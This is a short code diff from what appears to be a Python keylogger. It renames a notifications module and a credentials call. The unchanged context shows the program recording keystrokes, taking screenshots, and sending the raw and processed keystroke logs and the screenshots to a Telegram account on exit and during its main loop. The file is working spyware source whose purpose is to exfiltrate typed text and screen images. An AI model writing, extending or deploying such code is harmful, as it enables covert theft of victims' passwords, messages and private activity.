@@ -9,10 +9,7 @@ from keylogger_utils import (
     take_screenshot,
 )
 from log_utils import format_message, process_keys, write_to_log
-from telegram_utils import (
-    send_image_telegram,
-    send_info_telegram,
-)
+from notifications_utils import send_image_telegram, send_info_telegram
 
 
 def handle_keyboard_interrupt(key_listener):
@@ -35,7 +32,7 @@ def handle_keyboard_interrupt(key_listener):
     write_to_log(message, LOG_FILE)
     write_to_log(processed_message, LOG_FILE_2)
 
-    creds = credentials.get_credentials()
+    creds = credentials.get_credentials_telegram()
 
     # Load credentials a pass to send logs through Telegram
     send_info_telegram(**creds, message='RAW KEYLOGGER LOG\n\n' + message)
@@ -71,7 +68,7 @@ def main():
             write_to_log(message, LOG_FILE)
             write_to_log(processed_message, LOG_FILE_2)
 
-            creds = credentials.get_credentials()
+            creds = credentials.get_credentials_telegram()
 
             # Load credentials a pass to send logs through Telegram
             send_info_telegram(**creds,
@@ -80,6 +77,7 @@ def main():
                                message='PROCESSED KEYLOGGER LOG\n\n' +
                                processed_message)
             send_image_telegram(**creds, image=screenshot)
+
     except KeyboardInterrupt:
         handle_keyboard_interrupt(key_listener)
 
